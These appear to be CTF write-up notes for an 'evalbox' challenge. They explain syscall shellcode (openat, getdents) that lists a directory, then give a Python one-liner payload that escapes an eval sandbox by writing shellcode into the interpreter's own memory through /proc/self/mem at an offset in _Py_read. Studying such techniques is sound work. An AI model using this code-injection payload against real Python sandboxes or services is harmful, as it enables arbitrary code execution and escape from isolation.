## evalbox
---
### part1: get the name of the file (path)

* openat
* int openat(int dirfd, const char *pathname, int flags);
* set the path name as /home/ctf, AT_FDCWD is set correctly in the dirfd then the path name is taken relatively.
* openat:  
    * rdi: first argument: AT_FDCWD: -100
    * rsi: pointer to the path
    * rdx: 0 for read only
    * rax: syscall number, 257

* getdents:
    * int getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count);
    * it just reads several structures called linux_dirents from the open fd directory

    ```
    struct linux_dirent {
        unsigned long  d_ino;     /* Inode number */
        unsigned long  d_off;     /* Offset to next linux_dirent */
        unsigned short d_reclen;  /* Length of this linux_dirent */
        char           d_name[];  /* Filename (null-terminated) */
                            /* length is actually (d_reclen - 2 -
                            offsetof(struct linux_dirent, d_name) */
        /*
        char           pad;       // Zero padding byte
        char           d_type;    // File type (only since Linux 2.6.4;
                                // offset is (d_reclen - 1))
        */

    }
    ```

    * rdi: eax: which is the fd returned by the openat syscall
    * rsi: whatever is on top of the stack.
    * rdx: 0x1000 : buffer size of the dirent
    * rax: syscall for getdents: 78

> now recursive code to print out the names of the path with functions

```
r15 = rax: number of bytes read in.
r14 = 0
edx = 0

lp:
    write(1, rsp+r14+18, 20)
    write(newline)

    dx = *(rsp+r14+16)
    add r14d, edx
    cmp r14, r15
    jl lp

    exit()
    basically iterating through the linux_dirent and printing all the names inside it.
```

### finally the code (confusing):

#### code: 
* map to do a function to all the things in the iterable.
* all is just to check if everything worked, iterations in the map functions.

#### Virtual memory:
* the `/proc/` helps to represent the current state of the kernal
* /proc/self/maps: gives the memory mappings of the file.
* /proc/self/mem: memory held by the process.

```py
code = f"""
all(map(
    lambda fs: [
        fs[1].seek(int(fs[0].read(12), 16)+0x18ebb8, 0),
        fs[1].write({shellcode}),
        fs[1].flush(),
        input()
    ],
    [(open("/proc/self/maps"), open("/proc/self/mem", "wb"))]
))
""".replace("\n", "")
```

* get the first memory mapping address from the /proc/self/maps
* seek to a particular offset (which is somewhere in the _Py_read).
* write our shellcode at that memory offset
* flush the data
* Next time the read function is called we get the shell as the shellcode is excecuted.

### part 2:

* just do the same process this time you can just do open read write on the flag-(some md5).txt.
